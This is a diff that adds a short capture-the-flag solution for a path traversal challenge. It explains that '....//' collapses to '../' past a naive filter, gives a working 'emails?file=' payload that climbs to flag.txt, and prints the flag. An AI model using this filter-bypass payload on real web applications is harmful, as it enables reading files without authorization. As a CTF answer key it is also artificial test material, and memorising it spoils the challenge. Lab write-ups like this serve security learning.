@@ -1,0 +1,12 @@
+CHALLENGE SOLUTION:
+-------------------
+Traversal back to root for the flag.txt
+
+....// must be used instead of ../../
+....// == ../../
+
+Since you don't know how far back you need to go to reach root, use an excessive amount of ....//
+
+emails?file=/....//....//....//....//....//....//....//....//....//....//flag.txt
+
+FLAG: monkeyCTF{j0urn3y_t0_th3_w35t}
